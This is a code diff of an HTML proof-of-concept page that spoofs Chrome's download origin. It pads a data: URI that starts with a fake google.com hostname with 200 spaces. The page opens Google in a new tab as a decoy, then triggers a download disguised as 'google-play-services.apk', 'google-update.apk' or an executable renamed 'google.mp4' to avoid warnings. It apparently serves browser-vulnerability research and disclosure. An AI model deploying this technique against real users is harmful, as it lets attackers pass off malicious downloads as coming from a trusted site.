@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download Origin Spoof POC</title>
+  <title>POC - Download Origin Spoof</title>
   <style>
     body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
     h2 { color: #333; margin-bottom: 8px; }
@@ -13,76 +13,61 @@
       border-radius: 24px; width: 260px; text-align: center; cursor: pointer; outline: none;
       -webkit-tap-highlight-color: transparent;
     }
-    button {
-      padding: 12px 24px; font-size: 15px; background: #4285f4; color: #fff;
-      border: none; border-radius: 24px; cursor: pointer; margin: 8px;
-      -webkit-tap-highlight-color: transparent;
-    }
     p { color: #666; font-size: 13px; margin-top: 12px; }
     pre { background: #f5f5f5; padding: 12px; border-radius: 8px; font-size: 11px; text-align: left;
-          max-width: 500px; margin: 16px auto; overflow-x: auto; color: #666; }
+          max-width: 500px; margin: 16px auto; overflow-x: auto; color: #666; line-height: 1.6; }
     hr { border: none; border-top: 1px solid #eee; max-width: 400px; margin: 20px auto; }
+    a { color: #4285f4; text-decoration: none; font-size: 12px; }
+    a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
   <h2>Download Origin Spoof POC</h2>
-  <span class="badge">Chrome Android/Desktop</span>
+  <span class="badge">Chrome Android/Desktop - Data URI Abuse</span>
 
-  <p><b>Tap the input or button below:</b></p>
+  <p><b>Tap the input below:</b></p>
 
-  <input type="text" id="trigger" placeholder="Tap here" readonly>
-  <br>
-  <button id="btnDownload">Download File</button>
+  <input type="text" id="trigger" placeholder="Tap here to trigger" readonly>
 
   <p style="color:#888;font-size:12px;">
-    Opens Google in new tab → download prompt shows <b style="color:#ea4335">"google.com"</b> as origin
+    Opens Google → download appears with <b style="color:#ea4335">"google.com"</b> origin
   </p>
 
   <hr>
 
-  <pre>Real page origin: <span id="realOrigin"></span>
-Download shows:   <b style="color:#ea4335">data:https://google.com/...</b>
+  <pre>Real page origin:  <span id="realOrigin"></span>
+Download shows:    <b style="color:#ea4335">data:https://google.com</b>
 
-The download prompt displays the FAKE origin
-from inside the data: URI, not the real page.</pre>
+The data: URI embeds a fake hostname.
+Chrome displays it as the download origin
+instead of the real page origin.</pre>
 
   <hr>
 
-  <h3 style="font-size:14px;color:#333;">Test Variants</h3>
-  <p style="font-size:12px;">
-    <a href="download-spoof/poc.html">POC (Google style)</a> |
-    <a href="download-spoof/simple.html">POC (Simple)</a> |
-    <a href="download-spoof/android-bypass.html">Android Bypass Suite</a> |
-    <a href="download-spoof/poc-original.html">Original POC Replica</a>
+  <p style="font-size:12px;color:#888;">
+    Variants:
+    <a href="download-spoof/poc.html">Google Style</a> |
+    <a href="download-spoof/simple.html">Simple</a> |
+    <a href="download-spoof/poc-original.html">Original Replica</a> |
+    <a href="download-spoof/android-bypass.html">Android Bypass</a>
   </p>
 
   <script>
     document.getElementById('realOrigin').textContent = window.location.hostname;
 
-    var SP = ' '.repeat(200);
-    var B64_APK = 'UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
-
-    function attack(filename, mime) {
-      // 1. Open Google in new tab (distraction)
+    document.getElementById('trigger').addEventListener('click', function() {
+      // Open Google in new tab
       window.open('https://www.google.com', '_blank');
 
-      // 2. Trigger download on current page with spoofed origin
+      // Download with spoofed origin (mp4 = no warning on Android)
       setTimeout(function() {
         var a = document.createElement('a');
-        a.href = 'data:https://google.com/' + SP + mime + ';base64,' + B64_APK;
-        a.download = filename;
+        a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0';
+        a.download = 'google.mp4';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
       }, 500);
-    }
-
-    document.getElementById('trigger').addEventListener('click', function() {
-      attack('google-play-services.apk', 'application/vnd.android.package-archive');
-    });
-
-    document.getElementById('btnDownload').addEventListener('click', function() {
-      attack('google-update.apk', 'application/vnd.android.package-archive');
     });
   </script>
 </body>
